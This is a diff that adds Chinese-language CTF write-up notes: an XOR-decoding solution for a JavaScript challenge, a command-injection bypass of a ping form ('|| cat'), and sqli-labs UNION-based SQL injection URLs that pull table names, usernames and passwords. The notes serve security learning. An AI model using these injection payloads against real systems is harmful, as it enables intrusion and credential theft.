@@ -800,6 +800,63 @@ onclick、onerror、alert
 ```
 ---
 
+## [SWPUCTF 2021 新生赛]astJS
+
+https://www.nssctf.cn/problem/409
+
+* 考点：JS
+* 工具：esgenerate，python
+  
+题目提供的文件是一个 json 文件，通过查看其内容可以猜测是一个编写的程序，发现其中的可疑字符串：
+
+![](./img/JS-发现密文.png)
+
+怀疑是异或加密，编写代码尝试：
+
+```python
+c='EXXH_MpjxBxYnjggrM~eerv'
+flag=''
+for i in c:
+    flag+=chr(ord(i)^11)
+print(flag)
+```
+发现是 flag
+
+通过查看 wp 发现另外一个方法是通过使用 esgenerate 直接将 json 转化为可执行的 js ，然后通过 node 执行：
+
+![](./img/JS-工具转js.png)
+
+---
+
+## [LitCTF 2023]Ping
+
+https://www.nssctf.cn/problem/3873
+
+* 考点：RCE，前端绕过，Linux命令  
+* 工具：hackbar
+
+由于过滤条件是写在 javascript 中的，所以只在通过网页输入访问时有效，只要通过数据包发送即可绕过过滤，使用hackbar构建 POST 请求包，body 为 `command= || cat /ls`
+即在ping命令执行失败后执行后面的 cat 指令，获得 flag
+
+---
+## SQL注入：
+
+```
+------基于错误的GET单引号字符型注入------
+# 查回显点
+http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
+# 查数据库名
+http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,database(); --+
+# 查表
+http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
+# 查列
+http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(username) from information_schema.columns where table_name='users'--+
+# 查字段
+http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(password) from users--+
+
+
+```
+
 
 
 
